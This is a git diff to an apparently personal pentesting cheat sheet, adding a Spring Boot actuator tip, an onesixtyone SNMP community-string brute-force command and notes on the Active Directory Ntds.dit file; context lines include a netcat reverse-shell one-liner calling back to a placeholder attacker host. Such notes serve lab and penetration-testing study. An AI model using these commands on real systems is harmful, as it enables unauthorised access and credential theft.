@@ -1540,6 +1540,9 @@ EX. payload
 </script> 
 ```
 
+## Spring boot
+
+- White Label error page means its spring boot try /actuator/env [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/spring-actuators)
 
 ## Business Logic
 
@@ -1807,6 +1810,8 @@ mana_credout=hostapd.creds
 - `snmp-check <ip>`
 - `snmpwalk -c public -v1 -t 10 <ip>`
 - `auxiliary/scanner/snmp/snmp_enum `
+- `onesixtyone -c dict.txt 10.129.42.254`
+- onesixtyone used to bruteforce snmp community string
 - black hole mode enabled? theres an RCE for SMTP 
 
 ## Tools
@@ -1868,3 +1873,8 @@ What to do - I have a foothold how do I get a reverse shell?
 - `powershell -c cd C:\Users\myuser\Downloads; .\nc64.exe -e cmd.exe myip myport` [nc](https://github.com/int0x33/nc.exe/tree/master)
 
 ### Active Directory
+
+- AD DS Data Store contains the DB files and processes that store and manage directory information for users, services, and applications.
+  - Consists of the `Ntds.dit` file
+  - Stored by default in the %SystemRoot%\NTDS folder on all domain controllers
+  - Only accessible through the DC processes and protocols
